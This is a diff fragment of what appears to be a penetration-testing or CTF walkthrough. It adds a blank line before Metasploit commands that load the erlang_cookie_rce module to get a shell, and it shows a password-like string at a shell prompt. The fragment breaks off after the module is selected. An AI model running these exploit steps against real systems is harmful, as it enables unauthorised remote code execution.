@@ -266,6 +266,7 @@ azrael@forge:~$ m0hOx5SGVy4bLLD5
 ```
 
 Using metasploit to get a shell:
+
 ```console
 msfconsole -q
 use exploit/multi/misc/erlang_cookie_rce
